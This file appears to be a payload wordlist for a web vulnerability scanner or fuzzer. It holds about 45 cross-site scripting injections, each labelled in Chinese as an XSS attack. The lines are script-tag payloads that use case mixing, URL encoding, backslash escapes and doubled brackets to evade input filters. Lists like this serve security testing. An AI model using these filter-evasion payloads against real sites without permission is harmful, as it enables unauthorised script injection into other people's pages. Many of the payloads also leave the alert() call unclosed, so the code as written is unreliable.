+=%3e%3c%3e%3cScRiPt>AlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+="%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+="%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+='%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+='%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+="%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+="%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+='%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+='%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+\\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=><><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\\><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
